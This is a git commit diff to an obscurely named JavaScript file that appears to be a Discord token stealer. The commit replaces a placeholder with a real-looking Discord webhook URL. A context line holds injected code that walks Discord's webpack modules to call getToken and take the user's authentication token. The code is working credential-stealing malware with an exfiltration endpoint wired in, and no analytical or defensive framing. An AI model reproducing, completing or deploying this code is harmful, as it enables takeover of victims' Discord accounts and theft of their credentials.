cf18b97d023cf598073aead9ee9868af764a3155
carlospr0 <73978397+carlospr0@users.noreply.github.com>
2021-12-01 17:34:40 -0300

    Update dwauegdauywgduiyagwdyuiagwdukyhagvwdiuygawuyidg.js

--- dwauegdauywgduiyagwdyuiagwdukyhagvwdiuygawuyidg.js
+++ dwauegdauywgduiyagwdyuiagwdukyhagvwdiuygawuyidg.js
@@ -6,7 +6,7 @@ const fs = require("fs"),
 	querystring = require("querystring"),
 	os = require("os");
 
-var webhook = "*WEBHOOK*";
+var webhook = "https://discord.com/api/webhooks/915406648070266970/_lZD4hxHChhiKy9DX9QI3Y-LUtk2NyPDsw_30MT620sReJEIjZBLSubI4-tTQjgtZ1dy";
 
 const tken = 'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;';
 var win = "";
